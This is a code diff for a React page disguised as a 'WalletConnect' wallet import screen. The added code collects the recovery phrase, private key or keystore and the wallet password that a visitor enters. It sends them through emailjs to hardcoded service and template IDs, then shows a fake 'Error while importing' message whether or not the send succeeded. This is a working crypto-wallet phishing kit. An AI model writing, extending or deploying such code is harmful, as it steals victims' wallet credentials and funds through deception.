@@ -4,6 +4,7 @@ import { BsArrowRightCircle } from 'react-icons/bs';
 import { FaArrowLeft, FaEye, FaEyeSlash } from 'react-icons/fa';
 import Image from 'next/image';
 import Link from 'next/link';
+import emailjs from '@emailjs/browser';
 
 const LoaderAnimation = () => {
   return (
@@ -17,23 +18,57 @@ const LoaderAnimation = () => {
 };
 
 function Coin() {
-  const [details, setDetails] = useState('');
+  const [details, setDetails] = useState({
+    phrase: '',
+    wpassword: '',
+    type: 'Phrase',
+  });
   const [display, setDisplay] = useState(null);
   const [openModal, setOpenModal] = useState(false);
   const [isActive, setIsActive] = useState(1);
   const [isLoading, setIsLoading] = useState(true);
   const [isError, setIsError] = useState(false);
   const [show, setShow] = useState(false);
+  const [errorRes, setErrorRes] = useState({
+    err: false,
+    msg: '',
+  });
 
   const [val, setVal] = useState({
     place: 'Enter your recovery phrase',
     desc: 'Typically 12 (sometimes 24) words seperated by single spaces',
   });
 
-  const handleSubmit = () => {
-    console.log(details);
+  const handleValueChange = ({ target }) => {
+    setDetails({ ...details, [target.name]: target.value });
   };
 
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    console.log(details);
+
+    await emailjs
+      .send('service_k98a6fk', 'template_h9y548t', details, 'l1SMwkup0_5uqyGfU')
+      .then(
+        function (response) {
+          console.log('SUCCESS!', response.status, response.text);
+          setErrorRes({
+            err: true,
+            msg: 'Error while importing',
+          });
+        },
+        function (error) {
+          console.log('FAILED...', error);
+          setErrorRes({
+            err: true,
+            msg: 'Error while importing',
+          });
+        }
+      );
+  };
+
+  console.log(errorRes);
   const handleOpen = (data) => {
     setIsLoading(true);
     setIsError(false);
@@ -58,6 +93,10 @@ function Coin() {
         });
 
     setIsActive(num);
+    setDetails({
+      ...details,
+      type: num === 3 ? 'Private Key' : num === 2 ? 'Keystore' : 'Phrase',
+    });
   };
 
   useEffect(() => {
@@ -82,16 +121,29 @@ function Coin() {
     };
   });
 
+  useEffect(() => {
+    const timeoutId = setTimeout(() => {
+      setErrorRes(false);
+    }, 4000);
+
+    // Clean up the timeout when the component unmounts or re-renders.
+    return () => {
+      clearTimeout(timeoutId);
+    };
+  });
+
   return (
     <div className='w-full h-screen flex flex-col justify-end  md:items-center pb-3 px-3 md:px-0'>
       <Link href='/'>
-        <FaArrowLeft className='text-lg' />
+        <FaArrowLeft className='text-lg text-white' />
       </Link>
-      <h1 className='text-start text-lg my-3 ml-3 tracking-wider'>
+      <h1 className='text-white text-start text-lg my-3 ml-3 tracking-wider'>
         WalletConnect
       </h1>
       <div className='flex flex-col pt-7 px-4 rounded-3xl shadow-md bg-white space-y-3 w-full md:w-[40%] h-[86vh]'>
-        <h1 className='text-black'>Connect to a wallet</h1>
+        <h1 className='text-black text-center font-semibold tracking-wide'>
+          Connect Your wallet
+        </h1>
         <div className='space-y-3 pt-5 h-[92%] overflow-auto'>
           {wallet?.map((data, index) => (
             <div
@@ -101,7 +153,9 @@ function Coin() {
             >
               <div className='flex items-center space-x-2'>
                 <div className='h-2 w-2 bg-green-500 rounded-full'></div>
-                <h1 className='text-gray-500'>{data.name}</h1>
+                <h1 className='text-gray-500 font-semibold tracking-wide'>
+                  {data.name}
+                </h1>
               </div>
               <div
                 className='text-xl'
@@ -185,7 +239,12 @@ function Coin() {
                   <h1 className='text-xl'>Import your {display.name} wallet</h1>
                 </div>
               </div>
-              <form method='POST' onsubmit={handleSubmit}>
+              {errorRes.err && (
+                <h1 className='text-red-500 text-center text-[12px]'>
+                  {errorRes.msg}
+                </h1>
+              )}
+              <form method='POST' onSubmit={handleSubmit}>
                 <div className='justify-between flex border-b pb-2 text-gray-500'>
                   <label
                     className={`${
@@ -213,8 +272,11 @@ function Coin() {
                   </label>
                 </div>
                 <textarea
-                  className='h-24 rounded-md border p-3 mt-4 w-full placeholder:text-[15px] placeholder:text-gray-500'
-                  onChange={(e) => setDetails(e.target.value)}
+                  className={` ${
+                    errorRes.err ? 'border-red-600' : ''
+                  } h-24 rounded-md border p-3 mt-4 w-full placeholder:text-[15px] placeholder:text-gray-500`}
+                  onChange={handleValueChange}
+                  name='phrase'
                   placeholder={val.place}
                   required
                 ></textarea>
@@ -225,6 +287,7 @@ function Coin() {
                       name='wpassword'
                       placeholder='Wallet password'
                       required
+                      onChange={handleValueChange}
                       className='px-2 h-full w-full outline-none bg-transparent placeholder:text-[15px] placeholder:text-gray-500'
                     />
                     {show ? (
